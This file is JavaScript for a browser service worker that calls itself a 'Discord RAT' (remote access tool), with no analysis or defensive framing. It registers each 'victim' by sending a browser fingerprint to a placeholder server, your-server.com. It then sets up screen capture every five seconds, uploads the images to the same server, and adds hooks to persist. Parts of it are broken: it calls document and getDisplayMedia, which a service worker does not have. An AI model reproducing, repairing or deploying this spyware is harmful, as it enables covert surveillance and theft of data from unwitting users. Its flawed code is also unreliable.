// ==================== DISCORD RAT SERVICE WORKER ====================

let victimId = "unknown";
let screenshotInterval = null;

// Register victim when service worker starts
async function registerVictim() {
    try {
        const data = {
            userAgent: navigator.userAgent || "unknown",
            platform: navigator.platform || "unknown",
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language || "unknown",
            timestamp: Date.now(),
            url: self.registration.scope
        };

        const response = await fetch('https://your-server.com/victim', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        if (result.victimId) {
            victimId = result.victimId;
            console.log("%c[RAT] Connected with ID: " + victimId, "color: red; font-weight: bold");
        }
    } catch(e) {}
}

// Take screenshot and send it
async function takeScreenshot() {
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { 
                cursor: "never",
                displaySurface: "monitor"
            },
            audio: false
        });

        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const base64Image = canvas.toDataURL("image/jpeg", 0.65);

        await fetch('https://your-server.com/screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                victimId: victimId,
                image: base64Image,
                timestamp: Date.now()
            })
        });

        // Clean up
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        canvas.remove();

    } catch (err) {
        // Fallback if getDisplayMedia is blocked
        console.log("[RAT] Screenshot failed, retrying later...");
    }
}

// Start everything
self.addEventListener('activate', async () => {
    await self.clients.claim();
    await registerVictim();
    
    // Start taking screenshots every 5 seconds
    screenshotInterval = setInterval(() => {
        takeScreenshot();
    }, 5000);
});

// Keep service worker alive
self.addEventListener('fetch', () => {});

// Optional: Make it survive better
self.addEventListener('install', () => {
    self.skipWaiting();
});
